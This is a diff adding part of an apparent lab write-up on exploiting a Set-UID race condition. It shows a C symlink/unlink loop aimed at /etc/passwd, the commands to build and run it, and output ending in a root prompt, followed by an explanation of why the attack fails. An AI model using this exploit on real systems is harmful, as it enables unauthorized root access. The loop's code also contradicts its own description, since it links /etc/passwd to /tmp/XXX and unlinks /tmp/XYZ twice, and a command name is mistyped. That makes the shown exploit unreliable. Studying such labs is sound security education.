@@ -68,3 +68,40 @@
     done
     echo "STOP... The passwd file has been changed"
     ```
+- the core code of our target program `auto_atk.c`
+    ```
+    while(1) {
+        symlink("/etc/passwd", "/tmp/XYZ");
+        unlink("/tmp/XYZ");
+        symlink("/etc/passwd", "/tmp/XXX");
+        unlink("/tmp/XYZ");
+    }
+    ```
+- **attack succeeded**: we run our attack program, repeatedly link `/tmp/XYZ` to `/etc/passwd` and a `seed` owned file `/tmp/XXX`, and then run `target_process.sh`
+    ```
+    $ gcc -o auto_atk auto_atk.c
+    $ ./auto_atk
+    ```
+    ```
+    $ ./target_process.sj
+    Permission denied
+    Permission denied
+    Permission denied
+    Permission denied
+    Permission denied
+    STOP... The passwd file has been changed
+    $ test
+    Password:
+    #
+    ```
+
+- **attack failed**: in most cases, after a few loops, the owner of `/tmp/XYZ` becomes `root`, and the attack will not success, to imporve the chance to success, each time this happens, we should manually delete `/tmp/XYZ`
+    ```
+    $ ls -l /tmp/XYZ
+    -rw-rw-r-- 1 root seed 0 Jan 30 23:45 /tmp/XYZ
+    ```
+
+### Task 2.B: An Improved Attack
+- when the owner of `/tmp/XYZ` becomes `root`, our attack program can never remove or `unlink()` it, because the `/tmp` folder has a "sticky" bit on, meaning that only the owner of the file can delete the file, even though the folder is world-writable
+- the reason for this problem is that out attack program itself has a race condition vulnerability, the attack program is context switched out right after `unlink()`, but before it links the name to another file (`symlink()`), and the target `Set-UID` program gets a change to run `fopen(fn, "a+")`, it creates a new file with `root` being the owner
+
